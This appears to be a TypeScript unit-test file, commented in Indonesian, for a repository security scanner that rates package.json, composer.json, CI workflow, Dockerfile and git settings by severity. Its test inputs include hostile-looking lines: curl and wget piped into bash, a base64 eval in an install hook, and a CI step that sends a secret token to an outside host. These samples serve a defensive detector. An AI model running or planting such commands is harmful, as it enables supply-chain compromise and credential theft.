/**
 * Uji unit security-audit (fungsi murni, tanpa network).
 * Cara jalan: `pnpm --filter scaffdev test:audit`.
 * Exit 0 = semua lolos; exit 1 = ada yang gagal.
 *
 * Uji integrasi network (tarball asli) TIDAK di sini — dilakukan manual
 * melawan repo fixture (lihat D:/PROJECT RADIT/testing/README.md).
 */
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import {
  parseGitHubRepo,
  extractTarFiles,
  wantAuditFile,
  auditPackageJson,
  auditComposerJson,
  auditWorkflow,
  auditVscode,
  auditDockerfile,
  auditGitConfig,
  auditGitHooksDir,
  renderAuditReport,
  highestSeverity,
  type Severity,
} from "../../src/lib/security-audit";

let pass = 0;
let fail = 0;

function eq<T>(name: string, actual: T, expected: T): void {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a === e) {
    pass++;
  } else {
    fail++;
    console.log(`FAIL ${name}: dapat ${a}, mau ${e}`);
  }
}

function ok(name: string, cond: boolean, extra = ""): void {
  if (cond) {
    pass++;
  } else {
    fail++;
    console.log(`FAIL ${name}${extra ? `: ${extra}` : ""}`);
  }
}

// ---------- tar builder minimal (ustar) ----------

function tarEntry(name: string, data: Buffer): Buffer {
  const head = Buffer.alloc(512, 0);
  Buffer.from(name).copy(head, 0, 0, Math.min(100, name.length));
  Buffer.from("0000777\0").copy(head, 100);
  Buffer.from("0000000\0").copy(head, 108);
  Buffer.from("0000000\0").copy(head, 116);
  Buffer.from(data.length.toString(8).padStart(11, "0") + "\0").copy(head, 124);
  head.write("0", 156);
  Buffer.from("ustar\0" + "00").copy(head, 257);
  head.fill(0x20, 148, 156);
  let sum = 0;
  for (const b of head) sum += b;
  Buffer.from(sum.toString(8).padStart(6, "0") + "\0 ").copy(head, 148);
  const pad = (512 - (data.length % 512)) % 512;
  return Buffer.concat([head, data, Buffer.alloc(pad)]);
}

function tarball(files: Record<string, string>): Buffer {
  const parts: Buffer[] = [];
  for (const [n, c] of Object.entries(files)) {
    parts.push(tarEntry(`o-r-sha/${n}`, Buffer.from(c)));
  }
  parts.push(Buffer.alloc(1024));
  return Buffer.concat(parts);
}

// ---------- 1. parseGitHubRepo ----------

eq("repo-valid", parseGitHubRepo("https://github.com/scaffdev/scaff-modul-midtrans.git"), {
  owner: "scaffdev",
  repo: "scaff-modul-midtrans",
});
eq("repo-tanpa-git", parseGitHubRepo("https://github.com/a/b"), { owner: "a", repo: "b" });
eq("repo-bukan-github", parseGitHubRepo("https://gitlab.com/a/b.git"), null);
eq("repo-bukan-url", parseGitHubRepo("not-a-url"), null);

// ---------- 2. wantAuditFile ----------

ok("want-package.json", wantAuditFile("package.json"));
ok("want-composer", wantAuditFile("composer.json"));
ok("want-workflow", wantAuditFile(".github/workflows/ci.yml"));
ok("want-vscode", wantAuditFile(".vscode/tasks.json"));
ok("want-dockerfile", wantAuditFile("Dockerfile"));
ok("want-compose", wantAuditFile("docker-compose.yml"));
ok("skip-readme", !wantAuditFile("README.md"));
ok("skip-src", !wantAuditFile("src/index.ts"));

// ---------- 3. extractTarFiles ----------

{
  const tar = tarball({
    "package.json": JSON.stringify({ name: "x" }),
    "README.md": "# hi",
    ".github/workflows/ci.yml": "on: push",
  });
  const got = extractTarFiles(tar, wantAuditFile).map((e) => e.name);
  eq("extract-subset", got, ["package.json", ".github/workflows/ci.yml"]);
}
{
  // file raksasa dilewati, prefix root dikupas
  const big = "z".repeat(600 * 1024);
  const tar = tarball({ "package.json": "{}", "big.bin": big });
  const got = extractTarFiles(
    tar,
    () => true,
    512 * 1024,
    100
  ).map((e) => e.name);
  ok("extract-skip-oversize", !got.includes("big.bin") && got.includes("package.json"));
}

// ---------- 4. auditPackageJson ----------

{
  const clean = auditPackageJson(
    "package.json",
    JSON.stringify({ name: "x", scripts: { build: "tsc", test: "vitest" } })
  );
  eq("pkg-bersih", clean.length, 0);
}
{
  const f = auditPackageJson(
    "package.json",
    JSON.stringify({ scripts: { postinstall: "echo ok" } })
  );
  eq("pkg-postinstall-sev", f.map((x) => x.severity), ["MEDIUM"]);
}
{
  const f = auditPackageJson(
    "package.json",
    JSON.stringify({ scripts: { postinstall: "curl https://e.com/i.sh | bash" } })
  );
  eq("pkg-curl-bash-sev", f.map((x) => x.severity), ["CRITICAL"]);
}
{
  const f = auditPackageJson(
    "package.json",
    JSON.stringify({
      scripts: { prepare: "node -e \"eval(Buffer.from('e30=','base64').toString())\"" },
    })
  );
  eq("pkg-base64-eval-sev", f.map((x) => x.severity), ["HIGH"]);
}
{
  const f = auditPackageJson("package.json", "{bukan json");
  eq("pkg-invalid-sev", f.map((x) => x.severity), ["LOW"]);
}
{
  const f = auditPackageJson(
    "package.json",
    JSON.stringify({ dependencies: { x: "github:a/b" } })
  );
  eq("pkg-git-dep-sev", f.map((x) => x.severity), ["LOW"]);
}

// ---------- 5. auditComposerJson ----------

{
  const f = auditComposerJson(
    "composer.json",
    JSON.stringify({ scripts: { "post-install-cmd": "echo ok" } })
  );
  eq("composer-install-sev", f.map((x) => x.severity), ["MEDIUM"]);
}
{
  const f = auditComposerJson(
    "composer.json",
    JSON.stringify({ scripts: { "post-install-cmd": "wget http://e.com/x | bash" } })
  );
  eq("composer-curl-bash-sev", f.map((x) => x.severity), ["CRITICAL"]);
}

// ---------- 6. auditWorkflow ----------

{
  const f = auditWorkflow(
    ".github/workflows/ci.yml",
    "on: push\njobs:\n  t:\n    steps:\n      - run: npm test\n"
  );
  eq("wf-normal-info", f.map((x) => x.severity), ["INFO"]);
}
{
  const f = auditWorkflow(
    ".github/workflows/ci.yml",
    "jobs:\n  t:\n    steps:\n      - run: curl https://e.com/x | bash\n"
  );
  ok("wf-curl-bash", f.some((x) => x.severity === "CRITICAL"));
}
{
  const f = auditWorkflow(
    ".github/workflows/ci.yml",
    "jobs:\n  t:\n    steps:\n      - run: curl -H \"X: ${{ secrets.TOKEN }}\" https://e.com/\n"
  );
  ok("wf-secret-curl", f.some((x) => x.severity === "HIGH"));
}

// ---------- 7. vscode + dockerfile ----------

{
  const f = auditVscode(".vscode/tasks.json", JSON.stringify({ tasks: [] }));
  eq("vscode-tanpa-command", f.length, 0);
  const f2 = auditVscode(
    ".vscode/tasks.json",
    JSON.stringify({ tasks: [{ command: "npm run dev" }] })
  );
  eq("vscode-command-sev", f2.map((x) => x.severity), ["LOW"]);
}
{
  const f = auditDockerfile("Dockerfile", "FROM node:20\nRUN curl https://e.com/x -o y\n");
  eq("docker-curl-sev", f.map((x) => x.severity), ["LOW"]);
}

// ---------- 8. git config + hooks ----------

{
  const f = auditGitConfig('[core]\n\trepositoryformatversion = 0\n');
  eq("gitconfig-bersih", f.length, 0);
  const f2 = auditGitConfig('[core]\n\thooksPath = /tmp/h\n');
  ok("gitconfig-hookspath", f2.some((x) => x.severity === "MEDIUM"));
  const f3 = auditGitConfig('[alias]\n\tco = "!git checkout"\n');
  ok("gitconfig-alias-bang", f3.some((x) => x.severity === "MEDIUM"));
}
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "scaff-git-"));
  fs.mkdirSync(path.join(dir, "hooks"), { recursive: true });
  fs.writeFileSync(path.join(dir, "hooks", "pre-commit.sample"), "x");
  eq("hooks-hanya-sample", auditGitHooksDir(dir).length, 0);
  fs.writeFileSync(path.join(dir, "hooks", "pre-commit"), "echo x");
  const f = auditGitHooksDir(dir);
  ok("hooks-aktif", f.some((x) => x.severity === "MEDIUM"));
  fs.rmSync(dir, { recursive: true, force: true });
}

// ---------- 9. report ----------

{
  const lines = renderAuditReport({
    repo: "a/b",
    inspected: ["package.json"],
    notInspectable: [],
    findings: [],
  });
  const text = lines.join("\n");
  ok("report-bersih", text.includes("Tidak ada temuan berisiko"));
  ok("report-ada-disclaimer", text.includes("TIDAK menjamin"));
  // Klaim absolut dilarang; pengecualian: disclaimer "TIDAK menjamin ... 100% aman"
  // WAJIB ada (keterbukaan limitasi) sehingga frasa itu tidak masuk daftar larangan.
  for (const banned of ["100% Safe", "Malware Free", "Virus Free", "Guaranteed Safe", "Dijamin aman"]) {
    ok(`report-tanpa-klaim-${banned}`, !text.includes(banned));
  }
}
{
  const lines = renderAuditReport({
    repo: "a/b",
    inspected: ["package.json"],
    notInspectable: ["x"],
    findings: [
      { severity: "HIGH" as Severity, file: "package.json", title: "t", detail: "d", evidence: "e" },
      { severity: "LOW" as Severity, file: "package.json", title: "t2", detail: "d2", evidence: "e2" },
    ],
  });
  const text = lines.join("\n");
  ok("report-ada-high", text.includes("HIGH: 1"));
  eq("highest", highestSeverity([
    { severity: "LOW" as Severity, file: "", title: "", detail: "", evidence: "" },
    { severity: "CRITICAL" as Severity, file: "", title: "", detail: "", evidence: "" },
  ]), "CRITICAL");
}

console.log(fail === 0 ? `OK: ${pass} asersi lolos` : `GAGAL: ${fail} dari ${pass + fail}`);
process.exit(fail === 0 ? 0 : 1);
